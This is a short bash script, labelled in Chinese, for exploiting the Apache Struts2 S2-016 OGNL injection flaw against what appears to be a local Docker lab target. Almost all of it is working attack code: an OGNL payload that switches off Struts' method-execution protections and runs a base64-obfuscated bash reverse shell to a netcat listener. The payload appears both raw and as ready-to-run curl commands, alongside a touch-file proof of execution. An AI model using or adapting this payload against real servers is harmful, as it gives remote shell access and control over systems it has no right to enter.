#!/bin/bash

echo "=== S2-016 反弹Shell测试 ==="
echo ""
echo "目标IP: 192.168.127.128"
echo "目标端口: 4444"
echo ""

echo "[1] 启动监听..."
echo "请在另一个终端运行: nc -lvnp 4444"
echo ""
echo "[2] 测试S2-016漏洞..."
echo ""

PAYLOAD='redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),@java.lang.Runtime@getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTI4LjEyNy4xMjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}")}'

echo "访问以下URL测试:"
echo ""
echo "http://192.168.127.128:8080/index.action?${PAYLOAD}"
echo ""
echo "或者用curl测试:"
echo ""
echo 'curl -v "http://192.168.127.128:8080/index.action?redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%40java.lang.Runtime%40getRuntime%28%29.exec%28%22bash%20-c%20%7Becho%2CYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTI4LjEyNy4xMjgvNDQ0NCAwPiYx%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%29%29%7D"'
echo ""
echo "[3] 简单测试 - 执行touch命令:"
echo ""
echo 'curl -v "http://192.168.127.128:8080/index.action?redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/pwned%22%29%29%7D"'
echo ""
echo "执行后检查: docker compose exec struts2 ls /tmp/pwned"
